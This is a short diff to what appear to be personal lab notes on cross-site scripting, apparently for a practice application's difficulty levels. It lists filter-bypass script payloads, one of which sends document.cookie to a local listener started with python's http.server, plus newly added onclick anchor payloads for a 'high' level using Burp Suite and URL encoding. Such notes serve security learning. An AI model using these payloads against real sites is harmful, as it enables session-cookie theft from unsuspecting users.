@@ -21,3 +21,11 @@ python3 -m http.server 3000
 <scr<script>ipt>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
 <scr<script>ipt>alert(document.cookie)</script>
 ```
+
+### high
+### burp suite
+### ctrl u encode url
+```
+<a onclick="alert(1)" style=display:block>test</a>
+<a onclick="alert(document.cookie)" style=display:block>test</a>
+```
